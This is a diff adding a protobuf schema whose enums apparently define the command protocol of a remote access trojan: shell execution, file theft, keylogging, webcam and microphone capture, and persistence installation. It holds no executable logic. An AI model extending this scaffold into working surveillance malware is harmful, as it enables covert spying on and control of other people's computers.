@@ -1,0 +1,60 @@
+syntax = "proto3";
+
+package miau;
+
+enum PacketType {
+    PACKET_UNKNOWN   = 0;
+    PACKET_AUTH      = 1;
+    PACKET_AUTH_ACK  = 2;
+    PACKET_HEARTBEAT = 3;
+    PACKET_COMMAND   = 4;
+    PACKET_RESPONSE  = 5;
+    PACKET_FILE_CHUNK= 6;
+    PACKET_SCREEN    = 7;
+    PACKET_KEYLOG    = 8;
+    PACKET_MODULE    = 9;
+    PACKET_EVENT     = 10;
+}
+
+enum ClientState {
+    STATE_UNKNOWN  = 0;
+    STATE_ONLINE   = 1;
+    STATE_OFFLINE  = 2;
+    STATE_IDLE     = 3;
+    STATE_BUSY     = 4;
+}
+
+enum CommandType {
+    CMD_NONE           = 0;
+    CMD_SHELL_EXEC     = 1;
+    CMD_FILE_LIST      = 2;
+    CMD_FILE_DOWNLOAD  = 3;
+    CMD_FILE_UPLOAD    = 4;
+    CMD_FILE_DELETE    = 5;
+    CMD_PROCESS_LIST   = 6;
+    CMD_PROCESS_KILL   = 7;
+    CMD_NET_LIST       = 8;
+    CMD_SCREEN_START   = 9;
+    CMD_SCREEN_STOP    = 10;
+    CMD_WEBCAM_START   = 11;
+    CMD_WEBCAM_STOP    = 12;
+    CMD_MIC_START      = 13;
+    CMD_MIC_STOP       = 14;
+    CMD_KEYLOG_START   = 15;
+    CMD_KEYLOG_STOP    = 16;
+    CMD_PERSIST_INSTALL= 17;
+    CMD_PERSIST_REMOVE = 18;
+    CMD_MODULE_LOAD    = 19;
+    CMD_MODULE_EXEC    = 20;
+    CMD_MODULE_RESTART = 21;
+    CMD_UNINSTALL      = 22;
+    CMD_PING           = 23;
+    CMD_SYSINFO        = 24;
+}
+
+enum ResponseStatus {
+    RESP_OK     = 0;
+    RESP_ERROR  = 1;
+    RESP_PENDING= 2;
+    RESP_PARTIAL= 3;
+}
